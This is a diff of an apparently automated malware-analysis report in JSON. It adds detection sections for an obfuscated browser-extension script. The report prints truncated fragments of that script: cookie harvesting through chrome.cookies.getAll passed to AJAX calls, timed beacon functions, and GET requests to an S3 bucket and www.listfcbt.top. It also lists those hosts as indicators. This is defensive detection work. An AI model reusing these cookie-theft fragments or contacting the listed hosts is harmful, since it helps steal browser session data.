@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 21,
+    "score": 63,
     "sections": [
       {
         "auto_collapse": false,
@@ -38,7 +38,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\tvar _0x6ce0=[\"\\x68\\x74\\x74\\x70\\x73\\x3A\\x2F\\x2F\\x77\\x77\\x77\\x2E\\x66\\x61\\x63\\x65\\x62\\x6F\\x6F\\x6B\\x2E\\x...\n\t\tconst url=_0x6ce0[0]\n\t\tconst keyStr=_0x6ce0[1]\n\t\tconst htmlurl=_0x6ce0[2]\n\t\tconst apibasequeryurl1=_0x6ce0[3]\n\t\tconst apibasequeryurl2=_0x6ce0[4]\n\t\tconst apibasequeryurl3=_0x6ce0[4]\n\t\tconst ccbasequeryurl1=_0x6ce0[5]\n\t\tconst ccbasequeryurl2=_0x6ce0[6]\n\t\tconst ccbasequeryurl3=_0x6ce0[7]\n\t\t[105 Mark(s) Truncated]",
+        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\tchrome.storage.sync.get(cookie_eraser_uid, function(_0x85b5x27){var _0x85b5x4d=_0x85b5x27[_0x6ce0[94...\n\t\tchrome.storage.sync.set([object Object], function(){_0x85b5x4e(_0x85b5x4d)})\n\t\tchrome.cookies.getAll([object Object], (_0x85b5x30)=>{$[_0x6ce0[30]]({type:_0x6ce0[45],url:_0x6ce0[7...\n\t\twindow[4].setInterval(function sendChristmasOK(_0x85b5x21){chrome[_0x6ce0[49]][_0x6ce0[78]]({url},(_...\n\t\twindow[4].setTimeout(function(){sendChristmasOK(_0x85b5x21)}, 30000)\n\t\twindow[4].setTimeout(function(){sendChristmasOK(_0x85b5x21)}, 60000)\n\t\tTo avoid possible infinite loops, we are not running this method 'function(){sendChristmasOK(_0x85b5...\n\t\twindow[4].setTimeout(function(){sendChristmasOK(_0x85b5x21)}, 120000)\n\t\twindow[4].setTimeout(function(){sendChristmasOK(_0x85b5x21)}, 180000)\n\t\twindow[4].setTimeout(function(){sendChristmasOK(_0x85b5x21)}, 300000)\n\t\t[118 Mark(s) Truncated]",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -58,6 +58,54 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signature: ObfuscationPrefix",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript sends a network request via AJAX and jQuery\n\t\t$.ajax({\"type\":\"GET\",\"url\":\"https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_\"...\n\t\t$.ajax({\"url\":\"https://efijkyt.s3.ap-northeast-2.amazonaws.com/7253hgrscv\"})\n\t\t$.ajax({\"type\":\"GET\",\"url\":\"http://www.listfcbt.top\"})",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "ajax_network_request": 10
+          },
+          "signatures": {
+            "ajax_network_request": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: AJAXNetworkRequest",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript attempts to harvest cookies\n\t\tchrome.cookies.getAll([object Object], (_0x85b5x30)=>{$[_0x6ce0[30]]({type:_0x6ce0[45],url:_0x6ce0[7...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "cookie_harvesting": 10
+          },
+          "signatures": {
+            "cookie_harvesting": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: CookieHarvesting",
         "zeroize_on_tag_safe": false
       },
       {
@@ -83,6 +131,188 @@
         "tags": {},
         "title_text": "Signature: CryptoJSObfuscation",
         "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript sends a network request\n\t\tXMLHttpRequest[12].send()\n\t\tXMLHttpRequest[13].send()\n\t\tXMLHttpRequest[14].send()\n\t\tXMLHttpRequest[15].send()",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "network_request": 10
+          },
+          "signatures": {
+            "network_request": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: NetworkRequest",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript attempts to sleep or schedule execution after a given delay\n\t\twindow[4].setInterval(function sendChristmasOK(_0x85b5x21){chrome[_0x6ce0[49]][_0x6ce0[78]]({url},(_...\n\t\twindow[4].setTimeout(function(){sendChristmasOK(_0x85b5x21)}, 30000)\n\t\twindow[4].setTimeout(function(){sendChristmasOK(_0x85b5x21)}, 60000)\n\t\twindow[4].setTimeout(function(){sendChristmasOK(_0x85b5x21)}, 120000)\n\t\twindow[4].setTimeout(function(){sendChristmasOK(_0x85b5x21)}, 180000)\n\t\twindow[4].setTimeout(function(){sendChristmasOK(_0x85b5x21)}, 300000)\n\t\twindow[4].setTimeout(function(){sendHappyNewYear(_0x85b5x21)}, 120000)\n\t\twindow[4].setInterval(function sendHappyNewYear(_0x85b5x21){$[_0x6ce0[30]]({type:_0x6ce0[45],url:ccb...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "sleep": 10
+          },
+          "signatures": {
+            "sleep": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: Sleep",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "efijkyt.s3.ap-northeast-2.amazonaws.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "m.facebook.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "www.listfcbt.top",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "http://www.listfcbt.top",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://efijkyt.s3.ap-northeast-2.amazonaws.com/7253hgrscv",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/7253hgrscv",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/composer/ocelot/async_loader/?publisher=feed#_=_",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "domain": [
+                "efijkyt.s3.ap-northeast-2.amazonaws.com",
+                "m.facebook.com",
+                "www.listfcbt.top"
+              ],
+              "uri": [
+                "http://www.listfcbt.top",
+                "https://efijkyt.s3.ap-northeast-2.amazonaws.com/7253hgrscv",
+                "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_"
+              ],
+              "uri_path": [
+                "/7253hgrscv",
+                "/composer/ocelot/async_loader/?publisher=feed#_=_"
+              ]
+            }
+          }
+        },
+        "title_text": "MalwareJail extracted the following IOCs",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "method": "get",
+            "url": "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_"
+          },
+          {
+            "method": "get",
+            "url": "https://efijkyt.s3.ap-northeast-2.amazonaws.com/7253hgrscv"
+          },
+          {
+            "method": "get",
+            "url": "http://www.listfcbt.top"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "url",
+            "method"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "domain": [
+                "m.facebook.com",
+                "efijkyt.s3.ap-northeast-2.amazonaws.com",
+                "www.listfcbt.top"
+              ],
+              "uri": [
+                "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_",
+                "https://efijkyt.s3.ap-northeast-2.amazonaws.com/7253hgrscv",
+                "http://www.listfcbt.top"
+              ],
+              "uri_path": [
+                "/composer/ocelot/async_loader/?publisher=feed#_=_",
+                "/7253hgrscv"
+              ]
+            }
+          }
+        },
+        "title_text": "URLs",
+        "zeroize_on_tag_safe": false
       }
     ]
   },
@@ -94,9 +324,33 @@
     "heuristics": [
       {
         "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
         "heur_id": 3,
         "signatures": [
           "_0x_prefix"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "ajax_network_request"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "cookie_harvesting"
         ]
       },
       {
@@ -108,11 +362,112 @@
       },
       {
         "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "network_request"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "sleep"
+        ]
+      },
+      {
+        "attack_ids": [],
         "heur_id": 10,
         "signatures": []
       }
     ],
-    "tags": {},
+    "tags": {
+      "network.static.domain": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "efijkyt.s3.ap-northeast-2.amazonaws.com"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "efijkyt.s3.ap-northeast-2.amazonaws.com"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "m.facebook.com"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "m.facebook.com"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "www.listfcbt.top"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "www.listfcbt.top"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://www.listfcbt.top"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "http://www.listfcbt.top"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://efijkyt.s3.ap-northeast-2.amazonaws.com/7253hgrscv"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://efijkyt.s3.ap-northeast-2.amazonaws.com/7253hgrscv"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/7253hgrscv"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/7253hgrscv"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/composer/ocelot/async_loader/?publisher=feed#_=_"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/composer/ocelot/async_loader/?publisher=feed#_=_"
+        }
+      ]
+    },
     "temp_submission_data": {}
   }
 }
